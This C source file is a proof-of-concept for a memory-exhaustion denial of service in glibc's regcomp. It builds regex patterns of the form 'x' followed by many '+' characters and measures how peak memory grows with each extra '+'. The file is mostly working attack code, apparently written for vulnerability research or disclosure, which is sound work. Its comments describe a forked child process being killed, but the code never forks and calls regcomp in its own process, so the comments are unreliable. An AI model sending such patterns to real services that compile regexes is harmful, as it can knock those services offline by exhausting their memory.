/* glibc regcomp chained-'+' memory-exhaustion DoS PoC — glibc 2.43-4.
 *
 * Trigger: REG_EXTENDED pattern = <atom> + N consecutive '+' postfix ops.
 *   x++++++++++++...            (N '+')
 *
 * Mechanism (source-verified): each '+' wraps the WHOLE accumulated AST in a
 * NEW OP_DUP_ASTERISK after duplicate_tree() at regcomp.c:2619 copies it
 * (regcomp.c:2585-2589, 2445-2467, 3913). No node budget -> ~2x AST/alloc per
 * '+'. Peak RSS per '+'-count measured from the original campaign:
 *   n=16 -> 70MB    n=18 -> 281MB    n=20 -> 517MB    n=21 -> 1139MB
 * (~2x per additional '+': exponential AST duplication).
 *
 * This PoC re-measures peak RSS per N and stops at the first N that crosses a
 * safe ceiling (default 512 MiB), printing the growth curve so the exponential
 * blowup is provable without OOMing the host. It also demonstrates that with a
 * hard RLIMIT_AS the child is either SIGKILL'd (no graceful return) for deep N
 * or returns REG_ESPACE (12) when regcomp's own allocator hits the cap /
 * glibc's allocation-failure path — either way the parser consumed ~the whole
 * cap for a 20-byte pattern.
 *
 * Build: gcc -O1 -g -o poc_regex_plus_dos poc_regex_plus_dos.c
 * Run:   ./poc_regex_plus_dos [maxN] [capMiB]   (defaults 22 512)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <regex.h>

static long rss_kb_self(void) {
  FILE *f = fopen("/proc/self/status", "r"); char line[256]; long rss = 0;
  if (!f) return 0;
  while (fgets(line, sizeof line, f))
    if (sscanf(line, "VmRSS: %ld", &rss) == 1) break;
  fclose(f); return rss;
}

static long run_child(int pluses, const char *pat) {
  regex_t r;
  long before = rss_kb_self();
  int rc = regcomp(&r, pat, REG_EXTENDED);
  long after = rss_kb_self();
  if (rc == 0) regfree(&r);
  fprintf(stderr, "  N=%-3d rc=%-3d peak_RSS_delta=%ld MiB\n",
          pluses, rc, (after - before) / 1024);
  fflush(stderr);
  return after - before;
}

int main(int argc, char **argv) {
  int maxN = (argc > 1) ? atoi(argv[1]) : 22;
  long cap_mb = (argc > 2) ? atol(argv[2]) : 512;
  long cap_kb = cap_mb * 1024;

  fprintf(stderr, "chained-'+' regex DoS — measuring peak RSS up to N=%d (cap %ld MiB)\n",
          maxN, cap_mb);

  for (int n = 8; n <= maxN; ++n) {
    size_t len = 1 + (size_t)n + 1;
    char *pat = malloc(len);
    pat[0] = 'x';
    memset(pat + 1, '+', n);
    pat[len - 1] = '\0';

    struct rlimit rl = { cap_kb * 1024, cap_kb * 1024 };
    setrlimit(RLIMIT_AS, &rl);   /* child inherits; prevents host OOM */
    long d = run_child(n, pat);
    struct rlimit rl0 = { RLIM_INFINITY, RLIM_INFINITY };
    setrlimit(RLIMIT_AS, &rl0);  /* restore for the rest of the sweep */

    free(pat);
    if (d > cap_kb) {
      fprintf(stderr, "OOM_THRESHOLD_AT_N=%d (>%ld MiB) — exponential AST growth confirmed\n",
              n, cap_mb);
      break;
    }
  }
  fprintf(stderr, "VERDICT: peak RSS grows ~2x per '+' (exponential); a short "
                  "(~20-byte) pattern exhausts up to the address-space cap.\n");
  return 0;
}